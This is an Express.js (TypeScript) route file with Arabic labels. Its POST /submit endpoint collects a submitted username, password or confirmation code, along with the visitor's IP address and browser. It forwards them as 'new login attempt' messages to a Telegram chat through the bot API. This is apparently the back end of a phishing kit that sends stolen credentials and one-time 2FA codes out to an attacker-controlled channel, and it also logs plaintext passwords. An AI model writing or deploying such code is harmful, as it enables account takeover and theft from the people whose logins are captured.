import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

router.post("/submit", async (req: Request, res: Response) => {
  console.log('========================================');
  console.log('📥 [1] Request received at /submit');
  console.log('📥 [2] Request method:', req.method);
  console.log('📥 [3] Request headers:', JSON.stringify(req.headers, null, 2));
  console.log('📥 [4] Request body:', JSON.stringify(req.body, null, 2));
  console.log('========================================');

  // ✅ تأكد من إرسال JSON دائماً
  res.setHeader("Content-Type", "application/json");

  try {
    console.log('📥 [5] Starting try block...');
    
    const { username, password, timestamp, userAgent } = req.body;
    console.log('📥 [6] Extracted data:', { username, password, timestamp, userAgent });

    if (!username) {
      console.log('📥 [7] ❌ Username is missing!');
      const response = JSON.stringify({ error: "Username is required" });
      console.log('📥 [8] Sending response:', response);
      return res.status(400).send(response);
    }
    console.log('📥 [9] ✅ Username exists');

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    console.log('📥 [10] Bot Token:', botToken ? '✅ EXISTS' : '❌ MISSING');
    console.log('📥 [11] Chat ID:', chatId ? '✅ EXISTS' : '❌ MISSING');

    if (!botToken || !chatId) {
      console.error("📥 [12] ❌ Telegram credentials missing!");
      const response = JSON.stringify({ error: "Telegram not configured" });
      console.log('📥 [13] Sending response:', response);
      return res.status(500).send(response);
    }
    console.log('📥 [14] ✅ Telegram credentials configured');

    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';
    console.log('📥 [15] IP:', ip);

    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
    const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";

    const message = `
${title}

👤 اسم المستخدم: ${username}
${label} ${password}
⏱️ الوقت: ${timestamp || new Date().toLocaleString()}
🌐 IP: ${ip}
📱 المتصفح: ${userAgent || 'غير معروف'}
    `;
    console.log('📥 [16] Message to send:', message);
    console.log('📥 [17] Message length:', message.length);

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('📥 [18] Telegram URL (hidden token):', url.replace(botToken, 'HIDDEN'));
    console.log('📥 [19] Sending to Telegram...');

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    console.log('📥 [20] Telegram response status:', response.status);
    console.log('📥 [21] Telegram response ok?', response.ok);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("📥 [22] ❌ Telegram error response:", errorText);
      const errorResponse = JSON.stringify({ error: "Failed to send Telegram message", details: errorText });
      console.log('📥 [23] Sending error response:', errorResponse);
      return res.status(500).send(errorResponse);
    }

    const telegramData = await response.json();
    console.log('📥 [24] ✅ Telegram success:', telegramData);

    const successResponse = JSON.stringify({ success: true, message: "Notification sent" });
    console.log('📥 [25] ✅ Sending success response:', successResponse);
    return res.status(200).send(successResponse);

  } catch (error) {
    console.error("📥 [26] ❌ SERVER ERROR CATCH BLOCK!");
    console.error("📥 [27] Error name:", error.name);
    console.error("📥 [28] Error message:", error.message);
    console.error("📥 [29] Error stack:", error.stack);
    
    const errorResponse = JSON.stringify({ 
      error: "Internal server error",
      details: error.message 
    });
    console.log('📥 [30] Sending error response:', errorResponse);
    return res.status(500).send(errorResponse);
  }
});

export default router;
